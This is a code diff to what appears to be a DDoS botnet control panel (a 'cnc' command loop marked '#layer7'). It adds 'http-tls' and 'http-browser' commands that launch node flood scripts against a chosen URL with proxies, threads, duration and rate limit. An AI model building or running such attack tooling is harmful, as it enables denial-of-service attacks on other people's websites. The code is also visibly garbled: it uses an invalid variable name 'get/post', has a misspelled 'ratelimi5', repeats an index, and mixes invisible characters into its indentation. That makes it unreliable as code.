@@ -33,16 +33,29 @@ def main():
             tools()
         elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
             banners()
-
-        elif cnc == "http-tls"
+#layer7
+        elif "http-tls" in cnc:
       ‎ ‎ ‎ ‎ ‎ ‎ try:
         ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ url = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'node TLS.js {url} {time}')
+                os.system(f'node loader/TLS.js {url} {time}')
             except IndexError:
                 print('Usage: http-tls <url> <time>')
                 print('Example: http-tls http://vailon.com 60')
-      ‎‎  elif cnc == "http-browser"
+
+‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ elif "http-browser" in cnc:
+            try:
+                get/post = cnc.split()[1]
+                url = cnc.split()[2]
+                proxy = cnc.split()[3]
+                time = cnc.split()[4]
+                threads = cnc.split()[5]
+                ratelimi5 = cnc.split()[5]
+                os.system(f'node loader/BROWSER.js {get/post} {url} {proxy} {time} {threads} {ratelimit}')
+            except IndexError:
+                print('Usage: http-browser GET/POST URL PROXIES TIME THREADS RATELIMIT')
+                print('Example: http-raw GET http://example.com proxy.txt 60 100 100')
+                
 
       
         elif "help" in cnc:
